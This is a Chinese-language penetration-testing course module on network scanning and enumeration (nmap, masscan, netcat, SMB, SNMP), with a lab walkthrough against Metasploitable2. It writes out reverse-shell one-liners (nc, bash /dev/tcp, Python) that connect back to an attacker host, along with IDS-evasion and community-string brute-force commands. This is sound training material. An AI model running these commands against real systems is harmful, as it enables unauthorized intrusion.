@@ -1,0 +1,506 @@
+================================================================================
+模块03: 网络扫描与枚举技术
+================================================================================
+
+【学习目标】
+1. 掌握nmap完整功能: 主机发现, 端口扫描, 服务版本, OS检测, NSE脚本
+2. 学会masscan进行大规模快速端口扫描
+3. 掌握netcat的多功能用法 (端口扫描, 反弹shell, 文件传输)
+4. 能进行SMB和SNMP服务枚举
+5. 能对Metasploitable2完成完整扫描和枚举
+
+【所需工具】(archstrike-base已预装)
+- nmap
+- masscan
+- netcat (nc)
+- amap (可选)
+- enum4linux
+- smbclient
+- snmpwalk, onesixtyone
+- Metasploitable2虚拟机 (实验室目标)
+
+================================================================================
+第一部分: nmap 完整教程
+================================================================================
+
+1.1 主机发现 (Host Discovery)
+--------------------------------------------------
+
+ARP扫描 (局域网最有效):
+  nmap -sn 192.168.1.0/24                # Ping扫描(无端口扫描)
+  nmap -PR 192.168.1.0/24                # 仅ARP扫描
+  nmap -sP 192.168.1.0/24                # 旧式Ping扫描
+
+ICMP扫描 (跨网段):
+  nmap -PE 192.168.1.0/24                # ICMP Echo请求
+  nmap -PP 192.168.1.0/24                # ICMP时间戳请求
+  nmap -PM 192.168.1.0/24                # ICMP地址掩码请求
+
+TCP/UDP发现:
+  nmap -PS80,443 192.168.1.0/24          # TCP SYN到指定端口
+  nmap -PA80,443 192.168.1.0/24          # TCP ACK到指定端口
+  nmap -PU53,161 192.168.1.0/24          # UDP探测
+
+完整发现扫描:
+  nmap -sn -PS80,443 -PU53 -PE 192.168.1.0/24   # 组合多种探测
+
+1.2 端口扫描技术
+--------------------------------------------------
+
+TCP扫描:
+  nmap -sS 192.168.1.100         # SYN半开扫描 (默认, 需root)
+  nmap -sT 192.168.1.100         # TCP全连接扫描 (无需root)
+  nmap -sA 192.168.1.100         # ACK扫描 (测试防火墙规则)
+  nmap -sW 192.168.1.100         # 窗口扫描
+  nmap -sM 192.168.1.100         # Maimon扫描
+
+UDP扫描:
+  nmap -sU 192.168.1.100         # UDP扫描 (较慢, 需配合-p)
+  nmap -sU -p 53,67-69,161 192.168.1.100  # 常见UDP端口
+
+特殊扫描:
+  nmap -sN 192.168.1.100         # NULL扫描 (不设任何标志)
+  nmap -sF 192.168.1.100         # FIN扫描
+  nmap -sX 192.168.1.100         # Xmas扫描 (FIN,PSH,URG标志)
+  nmap -sZ 192.168.1.100         # SCTP INIT扫描
+
+1.3 端口范围指定
+--------------------------------------------------
+  -p 80,443,8080                  # 指定特定端口
+  -p 1-1024                       # 端口范围
+  -p-                             # 全部65535端口
+  -p U:53,T:80,443               # 指定UDP和TCP端口
+  --top-ports 1000                # 扫描前1000个常用端口
+  -F                              # 快速扫描 (前100端口)
+
+1.4 服务与版本检测
+--------------------------------------------------
+  nmap -sV 192.168.1.100         # 基本服务版本检测
+  nmap -sV --version-intensity 5  # 详细版本检测 (0-9, 默认7)
+  nmap -sV --version-all          # 尝试所有探针 (最高强度=9)
+  nmap -sV --version-trace        # 显示版本检测详细过程 (调试用)
+
+1.5 操作系统检测
+--------------------------------------------------
+  nmap -O 192.168.1.100          # 基本OS检测
+  nmap -O --osscan-guess         # 更激进的OS推测
+  nmap -A 192.168.1.100          # 全面扫描 (OS+版本+脚本+traceroute)
+
+1.6 NSE脚本引擎 (Nmap Scripting Engine)
+--------------------------------------------------
+
+脚本分类:
+  - auth: 认证相关
+  - broadcast: 广播发现
+  - brute: 暴力破解
+  - default: 默认安全脚本
+  - discovery: 发现
+  - dos: 拒绝服务 (谨慎!)
+  - exploit: 漏洞利用
+  - external: 外部服务
+  - fuzzer: 模糊测试
+  - intrusive: 侵入性 (可能影响目标)
+  - malware: 恶意软件检测
+  - safe: 安全脚本
+  - version: 版本检测
+  - vuln: 漏洞检测
+
+常用NSE命令:
+  # 默认安全脚本 (-sC)
+  nmap -sC 192.168.1.100
+
+  # 特定分类脚本
+  nmap --script=vuln 192.168.1.100
+  nmap --script=discovery 192.168.1.0/24
+  nmap --script=auth 192.168.1.100
+
+  # 运行多个分类
+  nmap --script "default and safe" 192.168.1.100
+
+  # 特定脚本
+  nmap --script=http-enum 192.168.1.100
+  nmap --script=smb-os-discovery,smb-enum-shares 192.168.1.100
+  nmap --script=ssl-heartbleed 192.168.1.100
+  nmap --script=http-wordpress-enum --script-args http-wordpress-enum.root="/blog/" 192.168.1.100
+
+  # 带参数的脚本
+  nmap --script=http-brute --script-args userdb=users.txt,passdb=pass.txt 192.168.1.100
+
+  # 使用通配符运行所有脚本
+  nmap --script "http-*" 192.168.1.100
+
+1.7 输出格式
+--------------------------------------------------
+  -oN scan.txt              # 标准文本格式
+  -oX scan.xml              # XML格式 (可导入Metasploit等工具)
+  -oG scan.gnmap            # Grepable格式 (~grep友好)
+  -oA scan                  # 同时输出所有三种格式
+  -oX -                     # XML输出到stdout
+  --stylesheet style.xsl    # 附带XSL样式表 (浏览器查看XML)
+
+实用命令:
+  nmap -sS -sV -sC -p- -oA fullscan 192.168.1.100
+
+1.8 时间与性能控制
+--------------------------------------------------
+  -T0 至 -T5    # 时间模板
+    T0: 偏执慢速 (IDS逃避最佳)
+    T1: 鬼祟
+    T2: 礼貌
+    T3: 正常 (默认)
+    T4: 激进
+    T5: 疯狂 (极快)
+
+  --min-rate 1000            # 最小发包速率 (包/秒)
+  --max-rate 5000            # 最大发包速率
+  --min-parallelism 100      # 最小并行探针数
+  --max-retries 2            # 最大重试次数
+  --host-timeout 30m         # 单个主机超时
+
+1.9 防火墙/IDS 绕过技术
+--------------------------------------------------
+  -f                          # 分片数据包 (8字节)
+  -ff                         # 更小分片 (16字节)
+  --mtu 16                    # 自定义MTU
+  -D 10.0.0.1,10.0.0.2,ME    # 诱饵扫描 (掺杂虚假IP)
+  -S 10.0.0.100               # 伪造源IP
+  --source-port 53            # 伪造源端口 (绕过ACL)
+  --data-length 200           # 附加随机数据
+  --randomize-hosts           # 随机化扫描顺序
+  --spoof-mac Apple           # 伪造MAC地址
+  -n                          # 不进行DNS解析
+  -g 53                       # 使用指定源端口
+
+避开检测的慢速扫描:
+  nmap -sS -T2 -f --data-length 50 -D 10.0.0.1,10.0.0.2,ME -n -Pn 192.168.1.100
+
+================================================================================
+第二部分: masscan 快速扫描
+================================================================================
+
+2.1 工具介绍
+--------------------------------------------------
+masscan 是史上最快的Internet端口扫描器, 使用自定义TCP/IP协议栈,
+可在数分钟内扫描整个互联网的单个端口。
+
+2.2 基本用法
+--------------------------------------------------
+
+基础扫描:
+  masscan 192.168.1.0/24 -p80,443,8080          # 扫描子网特定端口
+  masscan 192.168.1.100 -p1-65535               # 扫描全端口
+  masscan 192.168.1.0/24 -p22 --rate=1000       # 限制速率1000包/秒
+  masscan 192.168.1.0/24 -p80 --rate 100000     # 高速扫描
+
+参数说明:
+  -p          端口范围 (80 或 1-1024 或 U:53)
+  --rate      发包速率 (默认100包/秒)
+  --banners   获取服务Banner
+  --output-format 输出格式 (xml, binary, grepable, json, list)
+  -oL         Grepable格式输出
+  -oJ         JSON格式输出
+  -oX         XML格式输出
+
+实用命令:
+  # 快速全网段发现
+  masscan 10.0.0.0/8 -p22,80,443,8080,3389 --rate=10000 -oJ masscan.json
+
+  # 获取Banner
+  masscan 192.168.1.100 -p1-1000 --banners --rate=500
+
+  # 从nmap兼容格式输出
+  masscan 192.168.1.0/24 -p80 --rate=5000 -oX masscan.xml
+
+2.3 masscan vs nmap 使用场景
+--------------------------------------------------
+  masscan: 大规模快速端口发现 (全互联网/大网段)
+  nmap:    深度扫描, 服务识别, 漏洞检测, NSE脚本
+  最佳实践: masscan做初筛 → nmap对开放端口做深度扫描
+
+================================================================================
+第三部分: netcat (nc) 完整教程
+================================================================================
+
+3.1 工具介绍
+--------------------------------------------------
+netcat 被称为 "TCP/IP瑞士军刀", 功能包括:
+  端口扫描, 端口监听, 数据传输, 远程Shell, 代理等。
+
+3.2 端口监听
+--------------------------------------------------
+  nc -lvp 4444                        # 监听TCP 4444端口
+  nc -l -p 4444                       # 旧版本语法
+  nc -lvu 4444                        # 监听UDP端口
+  nc -lvp 4444 -k                     # 持续监听 (客户端断开后不退出)
+
+3.3 建立连接
+--------------------------------------------------
+  nc 10.0.0.1 4444                   # 连接到10.0.0.1的4444端口
+  nc -u 10.0.0.1 161                  # UDP连接
+
+3.4 端口扫描
+--------------------------------------------------
+  nc -zv 10.0.0.1 80                 # 测试单个端口
+  nc -zv 10.0.0.1 20-30              # 扫描端口范围
+  nc -zv 10.0.0.1 22 80 443         # 扫描多个端口
+  nc -znv 10.0.0.1 1-1000           # 扫描1-1000端口 (不发送数据)
+
+3.5 文件传输
+--------------------------------------------------
+  接收端: nc -lvp 4444 > received_file
+  发送端: nc 10.0.0.1 4444 < file_to_send
+
+  配合压缩传输目录:
+  接收端: nc -lvp 4444 | tar xzvf -
+  发送端: tar czvf - /path/to/dir | nc 10.0.0.1 4444
+
+3.6 反弹Shell
+--------------------------------------------------
+  攻击机 (监听): nc -lvp 4444
+  目标机 (连接): nc -e /bin/bash 10.0.0.1 4444
+
+  nc没有-e选项时的替代:
+  目标机: bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+  或: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+3.7 简易代理/中继
+--------------------------------------------------
+  mkfifo backpipe
+  nc -lvp 8080 < backpipe | nc 10.0.0.1 80 > backpipe
+
+3.8 Banner抓取
+--------------------------------------------------
+  echo "" | nc -v -w2 10.0.0.1 80    # HTTP banner
+  nc 10.0.0.1 22                     # SSH banner (直接连接后看到)
+
+================================================================================
+第四部分: SMB枚举
+================================================================================
+
+4.1 enum4linux 使用
+--------------------------------------------------
+
+功能: SMB/CIFS服务枚举, Windows系统信息收集
+
+基本命令:
+  # 完整枚举
+  enum4linux -a 192.168.1.100
+
+  # 用户列表枚举
+  enum4linux -U 192.168.1.100
+
+  # 共享列表
+  enum4linux -S 192.168.1.100
+
+  # 密码策略
+  enum4linux -P 192.168.1.100
+
+  # 组和成员
+  enum4linux -G 192.168.1.100
+
+  # 操作系统信息
+  enum4linux -o 192.168.1.100
+
+  # RID循环 (枚举用户)
+  enum4linux -r 192.168.1.100
+
+4.2 smbclient 使用
+--------------------------------------------------
+
+  # 列出共享
+  smbclient -L 192.168.1.100 -N                    # 匿名列出
+  smbclient -L 192.168.1.100 -U username           # 带认证
+
+  # 连接共享
+  smbclient //192.168.1.100/sharename -N           # 匿名连接
+  smbclient //192.168.1.100/C$ -U Administrator    # 管理共享
+
+  # 交互命令 (连接后)
+  smb: \> ls
+  smb: \> get filename
+  smb: \> put filename
+  smb: \> help
+
+4.3 nmap SMB脚本
+--------------------------------------------------
+  nmap --script smb-os-discovery 192.168.1.100
+  nmap --script smb-enum-shares 192.168.1.100
+  nmap --script smb-enum-users 192.168.1.100
+  nmap --script smb-vuln* 192.168.1.100           # SMB漏洞检测
+  nmap -p 445 --script smb-protocols 192.168.1.100
+
+================================================================================
+第五部分: SNMP枚举
+================================================================================
+
+5.1 SNMP基础
+--------------------------------------------------
+SNMP (Simple Network Management Protocol) 端口161 (UDP)
+Community String 相当于密码, 常见默认值:
+  - public (只读)
+  - private (读写)
+  - manager, admin, cisco
+
+5.2 snmpwalk 使用
+--------------------------------------------------
+
+  # 基本枚举 (使用public community)
+  snmpwalk -v 1 -c public 192.168.1.100
+
+  # v2c版本
+  snmpwalk -v 2c -c public 192.168.1.100
+
+  # 枚举特定MIB树
+  snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.1           # 系统信息
+  snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.25          # 主机资源
+  snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.4           # IP信息
+  snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.2.1.6           # TCP连接
+
+  # 获取系统用户
+  snmpwalk -v 2c -c public 192.168.1.100 HOST-RESOURCES-MIB::hrSystemProcesses
+  snmpwalk -v 2c -c public 192.168.1.100 1.3.6.1.4.1.77.1.2.25   # Windows用户
+
+5.3 onesixtyone - SNMP Community爆破
+--------------------------------------------------
+
+  onesixtyone -c community.txt 192.168.1.100
+
+  community.txt 内容:
+    public
+    private
+    manager
+    admin
+    cisco
+    internal
+
+5.4 nmap SNMP脚本
+--------------------------------------------------
+  nmap -sU -p 161 --script snmp-info 192.168.1.100
+  nmap -sU -p 161 --script snmp-brute 192.168.1.100
+  nmap -sU -p 161 --script snmp-processes 192.168.1.100
+
+================================================================================
+第六部分: 实践练习 - Metasploitable2 完整扫描
+================================================================================
+
+目标: 对Metasploitable2虚拟机进行完整的网络扫描和枚举
+
+实验环境:
+  攻击机 (ArchStrike): 192.168.1.50 (示例)
+  目标机 (Metasploitable2): 192.168.1.100 (根据实际IP调整)
+
+【路线指引 - Metasploitable2 完整扫描】
+
+=== 阶段一: 环境准备和主机发现 ===
+
+Step 1: 打开终端, 确认靶机已启动
+  在VirtualBox/VMware中启动Metasploitable2虚拟机
+
+Step 2: 发现靶机IP
+  sudo nmap -sn 192.168.1.0/24
+  或: sudo arp-scan --localnet
+  记录Metasploitable2的IP地址 (MAC地址通常为08:00:27开头)
+
+Step 3: 设置环境变量
+  export TARGET=192.168.1.100    # 替换为实际IP
+  mkdir -p ~/scan/ms2 && cd ~/scan/ms2
+
+=== 阶段二: 快速端口发现 ===
+
+Step 4: Masscan快速全端口扫描
+  sudo masscan $TARGET -p1-65535 --rate=5000 -oJ masscan_quick.json
+  cat masscan_quick.json | grep '"port"' | sort
+
+Step 5: 记录开放端口列表
+  将发现的端口保存: 21,22,23,25,80,110,111,139,445,512,513,514,
+  1099,1524,2049,2121,3306,5432,5900,6000,6667,8009,8180,...
+
+=== 阶段三: nmap深度扫描 ===
+
+Step 6: 对开放端口进行服务和版本扫描
+  sudo nmap -sS -sV -sC -p- -oA nmap_full $TARGET
+
+Step 7: 操作系统检测
+  sudo nmap -O -oN nmap_os.txt $TARGET
+
+Step 8: 漏洞扫描 (NSE vuln脚本)
+  sudo nmap --script=vuln -p- -oN nmap_vuln.txt $TARGET
+
+Step 9: 查看扫描结果
+  cat nmap_full.nmap
+  cat nmap_vuln.txt
+  重点关注: 服务版本, 已知漏洞, 弱认证服务
+
+=== 阶段四: 服务枚举 ===
+
+Step 10: SMB枚举
+  enum4linux -a $TARGET | tee enum4linux.txt
+  smbclient -L $TARGET -N
+  nmap --script smb-enum-shares,smb-enum-users,smb-os-discovery $TARGET
+
+Step 11: SNMP枚举 (如果161/UDP开放)
+  sudo nmap -sU -p 161 $TARGET
+  snmpwalk -v 2c -c public $TARGET | tee snmpwalk.txt
+  (如果有SNMP, 这将泄露大量系统信息)
+
+Step 12: HTTP服务枚举
+  nmap --script http-enum,http-methods,http-headers,http-title \
+    -p 80,8180 $TARGET
+
+Step 13: FTP/SMTP枚举
+  nmap --script ftp-anon,ftp-bounce -p 21 $TARGET
+  nmap --script smtp-commands,smtp-enum-users -p 25 $TARGET
+
+Step 14: Banner抓取各服务
+  nc -v $TARGET 21      # FTP
+  nc -v $TARGET 22      # SSH
+  nc -v $TARGET 80      # HTTP
+  nc -v $TARGET 3306    # MySQL
+
+=== 阶段五: 手动验证关键发现 ===
+
+Step 15: 测试匿名FTP访问
+  ftp $TARGET
+  尝试使用anonymous/anonymous登录
+
+Step 16: 测试VNC (5900端口)
+  nmap --script vnc-info -p 5900 $TARGET
+
+Step 17: 查看HTTP服务
+  打开Firefox浏览器
+  在地址栏输入: http://$TARGET (使用实际IP)
+  浏览网站, 识别Web应用 (DVWA, Mutillidae, phpMyAdmin等)
+
+Step 18: 查看phpMyAdmin (如果可用)
+  Firefox中打开: http://$TARGET/phpMyAdmin/
+
+Step 19: 编译完整发现报告
+  echo "============ Metasploitable2 扫描报告 ============" > scan_report.txt
+  echo "扫描时间: $(date)" >> scan_report.txt
+  echo "目标IP: $TARGET" >> scan_report.txt
+  echo "" >> scan_report.txt
+  echo "=== 开放端口和服务 ===" >> scan_report.txt
+  grep "open" nmap_full.nmap >> scan_report.txt
+  echo "" >> scan_report.txt
+  echo "=== 操作系统检测 ===" >> scan_report.txt
+  cat nmap_os.txt >> scan_report.txt
+  echo "" >> scan_report.txt
+  echo "=== 已知漏洞 ===" >> scan_report.txt
+  cat nmap_vuln.txt >> scan_report.txt
+  echo "" >> scan_report.txt
+  echo "=== SMB共享 ===" >> scan_report.txt
+  cat enum4linux.txt >> scan_report.txt
+  echo "" >> scan_report.txt
+  echo "============ 报告结束 ============" >> scan_report.txt
+
+【注意事项与提示】
+- nmap -A 是最全面的单个命令, 但很慢; 分步扫描效率更高
+- SYN扫描(-sS)需要root权限; 非root用-sT
+- UDP扫描(-sU)极慢; 仅扫描关键UDP端口(53, 67, 123, 161, 500)
+- NSE vuln脚本可能影响目标稳定性, 在生产环境谨慎使用
+- 扫描前确认有授权; 未经授权的扫描可能违反法律
+- Metasploitable2包含大量已知漏洞, 是理想的学习靶机
+- 记录所有扫描输出, 用于后续渗透阶段参考
+- masscan速度快但可能丢包; 对masscan发现的结果再用nmap验证
+
+================================================================================
